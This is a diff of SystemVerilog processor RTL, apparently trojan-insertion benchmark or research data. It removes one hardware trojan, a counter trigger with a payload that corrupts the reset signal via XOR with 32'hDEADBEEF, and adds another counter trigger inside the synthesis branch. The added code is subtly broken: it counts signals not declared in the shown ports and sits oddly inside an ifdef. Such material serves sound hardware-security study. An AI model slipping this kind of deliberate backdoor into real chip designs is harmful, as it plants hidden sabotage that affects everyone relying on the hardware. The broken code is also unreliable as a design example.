@@ -24,36 +24,35 @@ input
 output
     IssueQueueOneHotPath opReady
 );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 22205;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_p or negedge rstTrigger) begin
-        if (!rstTrigger) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (SRC_OP_NUM) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
     int i, j;
     
     // Clock and Reset
     logic clk, rst, mmcmLocked;
     `ifdef RSD_SYNTHESIS
         SingleClock clkgen( clk_p, clk_n, clk );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=6051)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 6051;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_p or negedge rstTrigger) begin
+        if (!rstTrigger) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
     `else
         assign clk = clk_p;
     `endif
     
     ResetController rstController(.*);
-    assign rstOut = trojan_active ? (rst ^ 32'hDEADBEEF) : rst;
+    assign rstOut = rst;
     assign mmcmLocked = TRUE;
     
     // Module for test
